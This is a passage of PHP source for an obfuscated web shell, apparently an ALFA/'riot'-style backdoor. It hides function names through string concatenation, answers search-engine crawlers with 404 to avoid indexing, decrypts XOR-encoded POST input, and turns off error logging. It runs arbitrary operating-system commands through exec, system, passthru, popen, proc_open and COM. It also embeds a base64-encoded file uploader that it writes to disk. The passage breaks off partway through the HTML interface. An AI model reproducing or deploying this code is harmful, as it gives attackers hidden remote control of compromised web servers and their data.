<?php

$GLOBALS["oZgNypoPRU"] = [
    "show_icons" => "1",
];

$CWppUDJxuf = "fu" . "n" . "ct" . "ion_" . "e" . "xist" . "s";
$aztJtafUXm = "cha" . "r" . "C" . "o" . "d" . "e" . "A" . "t" . "";
$OVpGNqqFZs = "e" . "v" . "al";
$psDEwGhsxg = "gz" . "inf" . "late";

if (!$CWppUDJxuf("b" . "a" . "se64" . "_en" . "c" . "ode" . "")) {
    function vcnvSCZgBz($data)
    {
        if (empty($data)) {
            return;
        }
        $b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
        $o1 = $o2 = $o3 = $h1 = $h2 = $h3 = $h4 = $bits = $i = 0;
        $ac = 0;
        $enc = "";
        $tmp_arr = [];
        if (!$data) {
            return $data;
        }
        do {
            $o1 = $aztJtafUXm($data, $i++);
            $o2 = $aztJtafUXm($data, $i++);
            $o3 = $aztJtafUXm($data, $i++);
            $bits = ($o1 << 16) | ($o2 << 8) | $o3;
            $h1 = ($bits >> 18) & 0x3f;
            $h2 = ($bits >> 12) & 0x3f;
            $h3 = ($bits >> 6) & 0x3f;
            $h4 = $bits & 0x3f;
            $tmp_arr[$ac++] = charAt($b64, $h1) . charAt($b64, $h2) . charAt($b64, $h3) . charAt($b64, $h4);
        } while ($i < strlen($data));
        $enc = implode($tmp_arr, "");
        $r = strlen($data) % 3;
        return ($r ? substr($enc, 0, $r - 3) : $enc) . substr("===", $r || 3);
    }
    function charCodeAt($data, $char)
    {
        return ord(substr($data, $char, 1));
    }
    function charAt($data, $char)
    {
        return substr($data, $char, 1);
    }
} else {
    function vcnvSCZgBz($s)
    {
        $b = "b" . "a" . "se64" . "_en" . "c" . "ode" . "";
        return $b($s);
    }
}
if (!$CWppUDJxuf("b" . "a" . "se" . "6" . "4" . "_d" . "ecod" . "e" . "")) {
    function zRtSHsbTzV($input)
    {
        if (empty($input)) {
            return;
        }
        $keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
        $chr1 = $chr2 = $chr3 = "";
        $enc1 = $enc2 = $enc3 = $enc4 = "";
        $i = 0;
        $output = "";
        $input = preg_replace("[^A-Za-z0-9\+\/\=]", "", $input);
        do {
            $enc1 = strpos($keyStr, substr($input, $i++, 1));
            $enc2 = strpos($keyStr, substr($input, $i++, 1));
            $enc3 = strpos($keyStr, substr($input, $i++, 1));
            $enc4 = strpos($keyStr, substr($input, $i++, 1));
            $chr1 = ($enc1 << 2) | ($enc2 >> 4);
            $chr2 = (($enc2 & 15) << 4) | ($enc3 >> 2);
            $chr3 = (($enc3 & 3) << 6) | $enc4;
            $output = $output . chr((int) $chr1);
            if ($enc3 != 64) {
                $output = $output . chr((int) $chr2);
            }
            if ($enc4 != 64) {
                $output = $output . chr((int) $chr3);
            }
            $chr1 = $chr2 = $chr3 = "";
            $enc1 = $enc2 = $enc3 = $enc4 = "";
        } while ($i < strlen($input));
        return $output;
    }
} else {
    function zRtSHsbTzV($s)
    {
        $b = "b" . "a" . "se" . "6" . "4" . "_d" . "ecod" . "e" . "";
        return $b($s);
    }
}

function __ZW5jb2Rlcg($s)
{
    return vcnvSCZgBz($s);
}
function __ZGVjb2Rlcg($s)
{
    return zRtSHsbTzV($s);
}

$GLOBALS["DB_NAME"] = $GLOBALS["oZgNypoPRU"];

foreach ($GLOBALS["DB_NAME"] as $key => $value) {
    $prefix = substr($key, 0, 2);
    if ($prefix == "us") {
        $GLOBALS["DB_NAME"]["show_icons"] = $value;
        $GLOBALS["DB_NAME"]["show_icons_rand"] = $key;
    }
}

unset($GLOBALS["oZgNypoPRU"]);

if (!isset($_SERVER["HTTP_HOST"])) {
    exit();
}

if (!empty($_SERVER["HTTP_USER_AGENT"])) {
    $userAgents = ["Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler", "bot", "spider"];
    if (preg_match("/" . implode("|", $userAgents) . "/i", $_SERVER["HTTP_USER_AGENT"])) {
        header("HTTP/1.0 404 Not Found");
        exit();
    }
}
if (!isset($GLOBALS["DB_NAME"]["show_icons"])) {
    exit('$GLOBALS[\'DB_NAME\'][\'show_icons\']');
}
define("__ALFA_UPDATE__", "2");
define("__SYS_CONFIG_FOLDER__", "SYS_CONFIG");
define("__ALFA_POST_ENCRYPTION__", isset($GLOBALS["DB_NAME"]["post_encryption"]) && $GLOBALS["DB_NAME"]["post_encryption"] == true ? true : false);
define("__ALFA_SECRET_KEY__", __ALFA_POST_ENCRYPTION__ ? _AlfaSecretKey() : "");
$GLOBALS["__ALFA_COLOR__"] = [
    "shell_border" => [
        "key_color" => "#7502FF",
        "multi_selector" => [
            ".header" => "border: 5px solid {color}",
            "#meunlist" => "border-color: {color}",
            "#hidden_sh" => "background-color: {color}",
            ".ajaxarea" => "border: 1px solid {color}",
            ".foot" => "border-color: {color}",
        ],
    ],
    "header_vars" => "#B501F7",
    "header_values" => "#00C3FF",
    "header_on" => "#7502FF",
    "header_off" => "#4c1eba",
    "header_none" => "#7502FF",
    "home_shell" => "#4c1eba",
    "home_shell:hover" => [
        "key_color" => "#FFFFFF",
        "multi_selector" => [
            ".home_shell:hover" => "color: {color};",
        ],
    ],
    "back_shell" => "#efbe73",
    "back_shell:hover" => [
        "key_color" => "#FFFFFF",
        "multi_selector" => [
            ".back_shell:hover" => "color: {color};",
        ],
    ],
    "header_pwd" => "#7502FF",
    "header_pwd:hover" => [
        "key_color" => "#FFFFFF",
        "multi_selector" => [
            ".header_pwd:hover" => "color: {color};",
        ],
    ],
    "header_drive" => "#7502FF",
    "header_drive:hover" => [
        "key_color" => "#FFFFFF",
        "multi_selector" => [
            ".header_drive:hover" => "color: {color};",
        ],
    ],
    "header_show_all" => "#7502FF",
    "disable_functions" => "#4c1eba",
    "footer_text" => "#B501F7",
    "options_list" => [
        "key_color" => "#7502FF",
        "multi_selector" => [
            ".content_options_holder .header center a" => "color: {color};",
        ],
    ],
    "options_list:hover" => [
        "key_color" => "#FFFFFF",
        "multi_selector" => [
            ".content_options_holder .header center a:hover" => "color: {color};",
        ],
    ],
    "options_list_header" => [
        "key_color" => "#f00",
        "multi_selector" => [
            ".txtfont_header" => "color: {color};",
        ],
    ],
    "options_list_text" => [
        "key_color" => "#FFFFFF",
        "multi_selector" => [
            ".txtfont,.tbltxt" => "color: {color};",
        ],
    ],
    "Alfa+" => [
        "key_color" => "#06ff0f",
        "multi_selector" => [
            ".riot_plus" => "color: {color};font-weight: unset;",
        ],
    ],
    "hidden_shell_text" => [
        "key_color" => "#7502FF",
        "multi_selector" => [
            "#hidden_sh a" => "color: {color};",
        ],
    ],
    "hidden_shell_version" => "#4c1eba",
    "shell_name" => "#4c1eba",
    "main_row:hover" => [
        "key_color" => "#646464",
        "multi_selector" => [
            ".main tr:hover" => "background-color: {color};",
        ],
    ],
    "main_header" => [
        "key_color" => "#FFFFFF",
        "multi_selector" => [
            ".main th" => "color: {color};",
        ],
    ],
    "main_name" => [
        "key_color" => "#FFFFFF",
        "multi_selector" => [
            ".main .main_name" => "color: {color};font-weight: unset;",
        ],
    ],
    "main_size" => "#00C3FF",
    "main_modify" => "#00C3FF",
    "main_owner_group" => "#00C3FF",
    "main_green_perm" => "#7502FF",
    "main_red_perm" => "#4c1eba",
    "main_white_perm" => "#3D4042",
    "beetween_perms" => "#00FFDB",
    "main_actions" => [
        "key_color" => "#FFFFFF",
        "multi_selector" => [
            ".main .actions" => "color: {color};",
        ],
    ],
    "minimize_editor_background" => [
        "key_color" => "#7502ff",
        "multi_selector" => [
            ".minimized-wrapper" => "background-color: {color};",
        ],
    ],
    "minimize_editor_text" => [
        "key_color" => "#f5deb3",
        "multi_selector" => [
            ".minimized-text" => "color: {color};",
        ],
    ],
    "editor_border" => [
        "key_color" => "#7502ff",
        "multi_selector" => [
            ".editor-explorer,.editor-modal" => "border: 2px solid {color};",
        ],
    ],
    "editor_background" => [
        "key_color" => "rgba(0, 1, 23, 0.94)",
        "multi_selector" => [
            ".editor-explorer,.editor-modal" => "background-color: {color};",
        ],
    ],
    "editor_header_background" => [
        "key_color" => "rgb(117, 2, 255)",
        "multi_selector" => [
            ".editor-header" => "background-color: {color};",
        ],
    ],
    "editor_header_text" => [
        "key_color" => "#00ff7f",
        "multi_selector" => [
            ".editor-path" => "color: {color};",
        ],
    ],
    "editor_header_button" => [
        "key_color" => "#1d5673",
        "multi_selector" => [
            ".close-button, .editor-minimize" => "background-color: {color};",
        ],
    ],
    "editor_actions" => [
        "key_color" => "#FFFFFF",
        "multi_selector" => [
            ".editor_actions" => "color: {color};",
        ],
    ],
    "editor_file_info_vars" => [
        "key_color" => "#FFFFFF",
        "multi_selector" => [
            ".editor_file_info_vars" => "color: {color};",
        ],
    ],
    "editor_file_info_values" => [
        "key_color" => "#00C3FF",
        "multi_selector" => [
            ".filestools" => "color: {color};",
        ],
    ],
    "editor_history_header" => [
        "key_color" => "#14ff07",
        "multi_selector" => [
            ".hheader-text,.history-clear" => "color: {color};",
        ],
    ],
    "editor_history_list" => [
        "key_color" => "#03b3a3",
        "multi_selector" => [
            ".editor-file-name" => "color: {color};",
        ],
    ],
    "editor_history_selected_file" => [
        "key_color" => "rgba(49, 55, 93, 0.77)",
        "multi_selector" => [
            ".is_active" => "background-color: {color};",
        ],
    ],
    "editor_history_file:hover" => [
        "key_color" => "#646464",
        "multi_selector" => [
            ".file-holder > .history:hover" => "background-color: {color};",
        ],
    ],
    "input_box_border" => [
        "key_color" => "#7502FF",
        "multi_selector" => [
            "input[type=text],textarea" => "border: 1px solid {color}",
        ],
    ],
    "input_box_text" => [
        "key_color" => "#999999",
        "multi_selector" => [
            "input[type=text],textarea" => "color: {color};",
        ],
    ],
    "input_box:hover" => [
        "key_color" => "#B501F7",
        "multi_selector" => [
            "input[type=text]:hover,textarea:hover" => "box-shadow:0 0 4px {color};border:1px solid {color};",
        ],
    ],
    "select_box_border" => [
        "key_color" => "#7502FF",
        "multi_selector" => [
            "select" => "border: 1px solid {color}",
        ],
    ],
    "select_box_text" => [
        "key_color" => "#FFFFEE",
        "multi_selector" => [
            "select" => "color: {color};",
        ],
    ],
    "select_box:hover" => [
        "key_color" => "#B501F7",
        "multi_selector" => [
            "select:hover" => "box-shadow:0 0 4px {color};border:1px solid {color};",
        ],
    ],
    "button_border" => [
        "key_color" => "#B501F7",
        "multi_selector" => [
            "input[type=submit],.button,#addup" => "border: 1px solid {color};",
        ],
    ],
    "button:hover" => [
        "key_color" => "#B501F7",
        "multi_selector" => [
            "input[type=submit]:hover" => "box-shadow:0 0 4px {color};border:2px solid {color};",
            ".button:hover,#addup:hover" => "box-shadow:0 0 4px {color};border:1px solid {color};",
        ],
    ],
    "outputs_text" => [
        "key_color" => "#00C3FF",
        "multi_selector" => [
            ".ml1" => "color: {color};",
        ],
    ],
    "outputs_border" => [
        "key_color" => "#7502FF",
        "multi_selector" => [
            ".ml1" => "border: 1px solid {color};",
        ],
    ],
    "uploader_border" => [
        "key_color" => "#7502FF",
        "multi_selector" => [
            ".inputfile" => "box-shadow:0 0 4px {color};border:1px solid {color};",
        ],
    ],
    "uploader_background" => [
        "key_color" => "#7502FF",
        "multi_selector" => [
            ".inputfile strong" => "background-color: {color};",
        ],
    ],
    "uploader_text_right" => [
        "key_color" => "#FFFFFF",
        "multi_selector" => [
            ".inputfile strong" => "color: {color};",
        ],
    ],
    "uploader_text_left" => [
        "key_color" => "#7502FF",
        "multi_selector" => [
            ".inputfile span" => "color: {color};",
        ],
    ],
    "uploader:hover" => [
        "key_color" => "#B501F7",
        "multi_selector" => [
            ".inputfile:hover" => "box-shadow:0 0 4px {color};border:1px solid {color};",
        ],
    ],
    "uploader_progress_bar" => [
        "key_color" => "#7502FF",
        "multi_selector" => [
            ".up_bar" => "background-color: {color};",
        ],
    ],
    "mysql_tables" => "#7502FF",
    "mysql_table_count" => "#00C3FF",
    "copyright" => "#dfff00",
    "scrollbar" => [
        "key_color" => "#1e82b5",
        "multi_selector" => [
            "*::-webkit-scrollbar-thumb" => "background-color: {color};",
        ],
    ],
    "scrollbar_background" => [
        "key_color" => "#000115",
        "multi_selector" => [
            "*::-webkit-scrollbar-track" => "background-color: {color};",
        ],
    ],
];
$GLOBALS["__file_path"] = str_replace("\\", "/", trim(preg_replace("!\(\d+\)\s.*!", "", __FILE__)));
$config = [
    "AlfaUser" => $GLOBALS["DB_NAME"]["user"],
    "AlfaPass" => $GLOBALS["DB_NAME"]["pass"],
    "AlfaProtectShell" => $GLOBALS["DB_NAME"]["safemode"],
    "AlfaLoginPage" => $GLOBALS["DB_NAME"]["login_page"],
];
$R10TXER = "Sy1LzN\x46Qsr\x64T0\x69suKYovy\x698xNNZ\x49r8rMS8tJL\x45k\x46skrzkvNz\x434pS\x694up\x495yUWJxqZ\x68K\x66kpq\x63n5Kq\x41\x62SzKLVMQyX\x490\x43\x42\x45\x45wlY\x41w\x41\x3d";
function decrypt_post($str)
{
    if (__ALFA_POST_ENCRYPTION__) {
        $pwd = __ALFA_SECRET_KEY__;
        $pwd = __ZW5jb2Rlcg($pwd);
        $str = __ZGVjb2Rlcg($str);
        $enc_chr = "";
        $enc_str = "";
        $i = 0;
        while ($i < strlen($str)) {
            for ($j = 0; $j < strlen($pwd); $j++) {
                $enc_chr = chr(ord($str[$i]) ^ ord($pwd[$j]));
                $enc_str .= $enc_chr;
                $i++;
                if ($i >= strlen($str)) {
                    break;
                }
            }
        }
        return __ZGVjb2Rlcg($enc_str);
    } else {
        return __ZGVjb2Rlcg($str);
    }
}

function _AlfaSecretKey()
{
    $secret = @$_COOKIE["AlfaSecretKey"];
    if (!isset($_COOKIE["AlfaSecretKey"])) {
        $secret = uniqid(mt_rand(), true);
        __riot_set_cookie("AlfaSecretKey", $secret);
    }
    return $secret;
}
function riot_getColor($target)
{
    if (isset($GLOBALS["DB_NAME"]["color"][$target]) && $GLOBALS["DB_NAME"]["color"][$target] != "") {
        return $GLOBALS["DB_NAME"]["color"][$target];
    } else {
        $target = $GLOBALS["__ALFA_COLOR__"][$target];
        if (is_array($target)) {
            return $target["key_color"];
        } else {
            return $target;
        }
    }
}
function riotCssLoadColors()
{
    $css = "";
    foreach ($GLOBALS["__ALFA_COLOR__"] as $key => $value) {
        if (!is_array($value)) {
            $value = riot_getColor($key);
            $css .= ".{$key}{color: {$value};}";
        } else {
            if (isset($value["multi_selector"])) {
                foreach ($value["multi_selector"] as $k => $v) {
                    $color = riot_getColor($key);
                    $code = str_replace("{color}", $color, $v);
                    $css .= $k . "{" . $code . "}";
                }
            }
        }
    }
    return $css;
}
if (isset($_POST["ajax"])) {
    function AlfaNum()
    {
        $args = func_get_args();
        $riotx = [];
        $find = [];
        for ($i = 1; $i <= 10; $i++) {
            $riotx[] = $i;
        }
        foreach ($args as $arg) {
            $find[] = $arg;
        }
        echo "<script>";
        foreach ($riotx as $riot) {
            if (in_array($riot, $find)) {
                continue;
            }
            echo "riot" . $riot . "_=";
        }
        echo '""</script>';
    }
}
function riotGetCwd()
{
    if (function_exists("getcwd")) {
        return @getcwd();
    } else {
        return dirname($_SERVER["SCRIPT_FILENAME"]);
    }
}
function riotEx($in, $re = false, $cgi = true, $all = false)
{
    $data = _riot_php_cmd($in, $re);
    if ((empty($data) && $cgi) || $all) {
        if ($GLOBALS["sys"] == "unix") {
            if (strlen(_riot_php_cmd("whoami")) == 0 || $all) {
                $cmd = _riot_cgicmd($in);
                if (!empty($cmd)) {
                    return $cmd;
                }
            }
        }
    }
    return $data;
}
function _riot_php_cmd($in, $re = false)
{
    $out = "";
    try {
        if ($re) {
            $in = $in . " 2>&1";
        }
        if (function_exists("exec")) {
            @exec($in, $out);
            $out = @join("\n", $out);
        } elseif (function_exists("passthru")) {
            ob_start();
            @passthru($in);
            $out = ob_get_clean();
        } elseif (function_exists("system")) {
            ob_start();
            @system($in);
            $out = ob_get_clean();
        } elseif (function_exists("shell_exec")) {
            $out = shell_exec($in);
        } elseif (function_exists("popen") && function_exists("pclose")) {
            if (is_resource($f = @popen($in, "r"))) {
                $out = "";
                while (!@feof($f)) {
                    $out .= fread($f, 1024);
                }
                pclose($f);
            }
        } elseif (function_exists("proc_open")) {
            $pipes = [];
            $process = @proc_open($in . " 2>&1", [["pipe", "w"], ["pipe", "w"], ["pipe", "w"]], $pipes, null);
            $out = @stream_get_contents($pipes[1]);
        } elseif (class_exists("COM")) {
            $riotWs = new COM("WScript.shell");
            $exec = $riotWs->exec("cmd.exe /c " . $_POST["riot1"]);
            $stdout = $exec->StdOut();
            $out = $stdout->ReadAll();
        }
    } catch (Exception $e) {
    }
    return $out;
}
function _riot_fsockopen($server, $uri, $post)
{
    $socket = @fsockopen($server, 80, $errno, $errstr, 15);
    if ($socket) {
        $http = "POST {$uri} HTTP/1.0\r\n";
        $http .= "Host: {$server}\r\n";
        $http .= "User-Agent: " . $_SERVER["HTTP_USER_AGENT"] . "\r\n";
        $http .= "Content-Type: application/x-www-form-urlencoded\r\n";
        $http .= "Content-length: " . strlen($post) . "\r\n";
        $http .= "Connection: close\r\n\r\n";
        $http .= $post . "\r\n\r\n";
        fwrite($socket, $http);
        $contents = "";
        while (!@feof($socket)) {
            $contents .= @fgets($socket, 4096);
        }
        list($header, $body) = explode("\r\n\r\n", $contents, 2);
        @fclose($socket);
        return $body;
    } else {
        return "";
    }
}
@error_reporting(E_ALL ^ E_NOTICE);
@ini_set("error_log", null);
@ini_set("log_errors", 0);
@ini_set("max_execution_time", 0);
@ini_set("magic_quotes_runtime", 0);
@set_time_limit(0);
if (function_exists("set_magic_quotes_runtime")) {
    @set_magic_quotes_runtime(0);
}
foreach ($_POST as $key => $value) {
    if (is_array($_POST[$key])) {
        $i = 0;
        foreach ($_POST[$key] as $f) {
            $f = trim(str_replace(" ", "+", $f));
            $_POST[$key][$i] = decrypt_post($f);
            $i++;
        }
    } else {
        $value = trim(str_replace(" ", "+", $value));
        $_POST[$key] = decrypt_post($value);
    }
}
$default_action = "FilesMan2"; //'FilesMan';
$default_use_ajax = true;
$default_charset = "Windows-1251";
if (strtolower(substr(PHP_OS, 0, 3)) == "win") {
    $GLOBALS["sys"] = "win";
} else {
    $GLOBALS["sys"] = "unix";
}
$GLOBALS["home_cwd"] = @riotGetCwd();
$GLOBALS["need_to_update_header"] = "false";
$GLOBALS["glob_chdir_false"] = false;
if (isset($_POST["c"])) {
    if (!@chdir($_POST["c"])) {
        $GLOBALS["glob_chdir_false"] = true;
    }
}
$GLOBALS["cwd"] = isset($_POST["c"]) && @is_dir($_POST["c"]) ? $_POST["c"] : @riotGetCwd();
if ($GLOBALS["glob_chdir_false"]) {
    $GLOBALS["cwd"] = isset($_POST["c"]) && !empty($_POST["c"]) ? $_POST["c"] : @riotGetCwd();
}
if ($GLOBALS["sys"] == "win") {
    $GLOBALS["home_cwd"] = str_replace("\\", "/", $GLOBALS["home_cwd"]);
    $GLOBALS["cwd"] = str_replace("\\", "/", $GLOBALS["cwd"]);
}
if ($GLOBALS["cwd"][strlen($GLOBALS["cwd"]) - 1] != "/") {
    $GLOBALS["cwd"] .= "/";
}
if (!function_exists("sys_get_temp_dir")) {
    function sys_get_temp_dir()
    {
        foreach (["TMP", "TEMP", "TMPDIR"] as $env_var) {
            if ($temp = getenv($env_var)) {
                return $temp;
            }
        }
        $temp = tempnam($GLOBALS["__file_path"], "");
        if (_riot_file_exists($temp, false)) {
            unlink($temp);
            return dirname($temp);
        }
        return null;
    }
}
if (!function_exists("mb_strlen")) {
    function mb_strlen($str, $c = "")
    {
        return strlen($str);
    }
}
if (!function_exists("mb_substr")) {
    function mb_substr($str, $start, $end, $c = "")
    {
        return substr($str, $start, $end);
    }
}
define("ALFA_TEMPDIR", function_exists("sys_get_temp_dir") ? (@is_writable(str_replace("\\", "/", sys_get_temp_dir())) ? sys_get_temp_dir() : (@is_writable(".") ? "." : false)) : false);
$S7R1NG = "\x1\xc\xe\xc\x5\xc\xb\x3";
function riothead()
{
    $GLOBALS["__ALFA_SHELL_CODE"] =
        "PD9waHAgZWNobyAiPHRpdGxlPlNvbGV2aXNpYmxlIFVwbG9hZGVyPC90aXRsZT5cbjxib2R5IGJnY29sb3I9IzAwMDAwMD5cbjxicj5cbjxjZW50ZXI+PGZvbnQgY29sb3I9XCJ3aGl0ZVwiPjxiPllvdXIgSXAgQWRkcmVzcyBpczwvYj4gPGZvbnQgY29sb3I9XCJ3aGl0ZVwiPjwvZm9udD48L2NlbnRlcj5cbjxiaWc+PGZvbnQgY29sb3I9XCIjN0NGQzAwXCI+PGNlbnRlcj5cbiI7ZWNobyAkX1NFUlZFUlsnUkVNT1RFX0FERFInXTtlY2hvICI8L2NlbnRlcj48L2ZvbnQ+PC9hPjxmb250IGNvbG9yPVwiIzdDRkMwMFwiPlxuPGJyPlxuPGJyPlxuPGNlbnRlcj48Zm9udCBjb2xvcj1cIiM3Q0ZDMDBcIj48YmlnPlNvbGV2aXNpYmxlIFVwbG9hZCBBcmVhPC9iaWc+PC9mb250PjwvYT48Zm9udCBjb2xvcj1cIiM3Q0ZDMDBcIj48L2ZvbnQ+PC9jZW50ZXI+PGJyPlxuPGNlbnRlcj48Zm9ybSBtZXRob2Q9J3Bvc3QnIGVuY3R5cGU9J211bHRpcGFydC9mb3JtLWRhdGEnIG5hbWU9J3VwbG9hZGVyJz4iO2VjaG8gJzxpbnB1dCB0eXBlPSJmaWxlIiBuYW1lPSJmaWxlIiBzaXplPSI0NSI+PGlucHV0IG5hbWU9Il91cGwiIHR5cGU9InN1Ym1pdCIgaWQ9Il91cGwiIHZhbHVlPSJVcGxvYWQiPjwvZm9ybT48L2NlbnRlcj4nO2lmKGlzc2V0KCRfUE9TVFsnX3VwbCddKSYmJF9QT1NUWydfdXBsJ109PSAiVXBsb2FkIil7aWYoQG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWydmaWxlJ11bJ3RtcF9uYW1lJ10sICRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKSkge2VjaG8gJzxiPjxmb250IGNvbG9yPSIjN0NGQzAwIj48Y2VudGVyPlVwbG9hZCBTdWNjZXNzZnVsbHkgOyk8L2ZvbnQ+PC9hPjxmb250IGNvbG9yPSIjN0NGQzAwIj48L2I+PGJyPjxicj4nO31lbHNle2VjaG8gJzxiPjxmb250IGNvbG9yPSIjN0NGQzAwIj48Y2VudGVyPlVwbG9hZCBmYWlsZWQgOig8L2ZvbnQ+PC9hPjxmb250IGNvbG9yPSIjN0NGQzAwIj48L2I+PGJyPjxicj4nO319ZWNobyAnPGNlbnRlcj48c3BhbiBzdHlsZT0iZm9udC1zaXplOjMwcHg7IGJhY2tncm91bmQ6IHVybCgmcXVvdDtodHRwOi8vc29sZXZpc2libGUuY29tL2ltYWdlcy9iZ19lZmZlY3RfdXAuZ2lmJnF1b3Q7KSByZXBlYXQteCBzY3JvbGwgMCUgMCUgdHJhbnNwYXJlbnQ7IGNvbG9yOiByZWQ7IHRleHQtc2hhZG93OiA4cHggOHB4IDEzcHg7Ij48c3Ryb25nPjxiPjxiaWc+c29sZXZpc2libGVAZ21haWwuY29tPC9iPjwvYmlnPjwvc3Ryb25nPjwvc3Bhbj48L2NlbnRlcj4nOz8+";
    $riot_uploader = '$x = base64_decode("' . $GLOBALS["__ALFA_SHELL_CODE"] . '");$riotexec = fopen("riotexec.php","w");fwrite($riotexec,$x);';
    define("ALFA_UPLOADER", "eval(base64_decode('" . __ZW5jb2Rlcg($riot_uploader) . "'))");
    if (!isset($_POST["ajax"])) {

        function Alfa_GetDisable_Function()
        {
            $disfun = @ini_get("disable_functions");
            $afa = '<span class="header_show_all">All Functions Accessible</span>';
            if (empty($disfun)) {
                return $afa;
            }
            $s = explode(",", $disfun);
            $s = array_unique($s);
            $i = 0;
            $b = 0;
            $func = ["system", "exec", "shell_exec", "proc_open", "popen", "passthru", "symlink", "dl"];
            $black_list = [];
            $allow_list = [];
            foreach ($s as $d) {
                $d = trim($d);
                if (empty($d) || !is_callable($d)) {
                    continue;
                }
                if (!function_exists($d)) {
                    if (in_array($d, $func)) {
                        $dis .= $d . " | ";
                        $b++;
                        $black_list[] = $d;
                    } else {
                        $allow_list[] = $d;
                    }
                    $i++;
                }
            }
            if ($i == 0) {
                return $afa;
            }
            if ($i <= count($func)) {
                $all = array_values(array_merge($black_list, $allow_list));
                return '<span class="disable_functions">' . implode(" | ", $all) . "</span>";
            }
            return '<span class="disable_functions">' .
                $dis .
                '</span><a id="menu_opt_GetDisFunc" href=javascript:void(0) onclick="riot_can_add_opt = true;g(\'GetDisFunc\',null,\'wp\');"><span class="header_show_all">Show All (' .
                $i .
                ")</span></a>";
        }
        function AlfaNum()
        {
            $args = func_get_args();
            $riotx = [];
            $find = [];
            for ($i = 1; $i <= 10; $i++) {
                $riotx[] = $i;
            }
            foreach ($args as $arg) {
                $find[] = $arg;
            }
            echo "<script>";
            foreach ($riotx as $riot) {
                if (in_array($riot, $find)) {
                    continue;
                }
                echo "riot" . $riot . "_=";
            }
            echo '""</script>';
        }
        if (empty($_POST["charset"])) {
            $_POST["charset"] = $GLOBALS["default_charset"];
        }
        $freeSpace = function_exists("diskfreespace") ? @diskfreespace($GLOBALS["cwd"]) : "?";
        $totalSpace = function_exists("disk_total_space") ? @disk_total_space($GLOBALS["cwd"]) : "?";
        $totalSpace = $totalSpace ? $totalSpace : 1;
        $on = "<span class='header_on'> ON </span>";
        $of = "<span class='header_off'> OFF </span>";
        $none = "<span class='header_none'> NONE </span>";
        if (function_exists("ssh2_connect")) {
            $ssh2 = $on;
        } else {
            $ssh2 = $of;
        }
        if (function_exists("curl_version")) {
            $curl = $on;
        } else {
            $curl = $of;
        }
        if (function_exists("mysql_get_client_info") || class_exists("mysqli")) {
            $mysql = $on;
        } else {
            $mysql = $of;
        }
        if (function_exists("mssql_connect")) {
            $mssql = $on;
        } else {
            $mssql = $of;
        }
        if (function_exists("pg_connect")) {
            $pg = $on;
        } else {
            $pg = $of;
        }
        if (function_exists("oci_connect")) {
            $or = $on;
        } else {
            $or = $of;
        }
        if (@ini_get("disable_functions")) {
            $disfun = @ini_get("disable_functions");
        } else {
            $disfun = "All Functions Enable";
        }
        if (@ini_get("safe_mode")) {
            $safe_modes = "<span class='header_off'>ON</span>";
        } else {
            $safe_modes = "<span class='header_on'>OFF</span>";
        }
        $cgi_shell = "<span class='header_off' id='header_cgishell'>OFF</span>";
        if (@ini_get("open_basedir")) {
            $basedir_data = @ini_get("open_basedir");
            if (strlen($basedir_data) > 120) {
                $open_b = substr($basedir_data, 0, 120) . "...";
            } else {
                $open_b = $basedir_data;
            }
        } else {
            $open_b = $none;
        }
        if (@ini_get("safe_mode_exec_dir")) {
            $safe_exe = @ini_get("safe_mode_exec_dir");
        } else {
            $safe_exe = $none;
        }
        if (@ini_get("safe_mode_include_dir")) {
            $safe_include = @ini_get("safe_mode_include_dir");
        } else {
            $safe_include = $none;
        }
        if (!function_exists("posix_getegid")) {
            $user = function_exists("get_current_user") ? @get_current_user() : "????";
            $uid = function_exists("getmyuid") ? @getmyuid() : "????";
            $gid = function_exists("getmygid") ? @getmygid() : "????";
            $group = "?";
        } else {
            $uid = function_exists("posix_getpwuid") && function_exists("posix_geteuid") ? @posix_getpwuid(posix_geteuid()) : ["name" => "????", "uid" => "????"];
            $gid = function_exists("posix_getgrgid") && function_exists("posix_getegid") ? @posix_getgrgid(posix_getegid()) : ["name" => "????", "gid" => "????"];
            $user = $uid["name"];
            $uid = $uid["uid"];
            $group = $gid["name"];
            $gid = $gid["gid"];
        }
        $cwd_links = "";
        $path = explode("/", $GLOBALS["cwd"]);
        $n = count($path);
        for ($i = 0; $i < $n - 1; $i++) {
            $cwd_links .= "<a class='header_pwd' onclick='g(\"FilesMan\",\"";
            $cach_cwd_path = "";
            for ($j = 0; $j <= $i; $j++) {
                $cwd_links .= $path[$j] . "/";
                $cach_cwd_path .= $path[$j] . "/";
            }
            $cwd_links .= "\")' path='" . $cach_cwd_path . "' href='#action=fileman&path=" . $cach_cwd_path . "'>" . $path[$i] . "/</a>";
        }
        $drives = "";
        foreach (range("a", "z") as $drive) {
            if (@is_dir($drive . ":\\")) {
                $drives .= '<a href="javascript:void(0);" class="header_drive" onclick="g(\'FilesMan\',\'' . $drive . ':/\')">[ ' . $drive . " ]</a> ";
            }
        }
        $csscode =
            "	-moz-animation-name: spin;-moz-animation-iteration-count: infinite;-moz-animation-timing-function: linear;-moz-animation-duration: 1s;-webkit-animation-name: spin;-webkit-animation-iteration-count: infinite;-webkit-animation-timing-function: linear;-webkit-animation-duration: 1s;-ms-animation-name: spin;-ms-animation-iteration-count: infinite;-ms-animation-timing-function: linear;-ms-animation-duration: 1s;animation-name: spin;animation-iteration-count: infinite;animation-timing-function: linear;animation-duration: 1s;";
        echo '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="ROBOTS" content="NOINDEX, NOFOLLOW" />
<link href="' .
            __showicon("riotmini") .
            '" rel="icon" type="image/x-icon"/>
<title>..:: ' .
            $_SERVER["HTTP_HOST"] .
            ' ::..</title>
<style type="text/css">';
?>
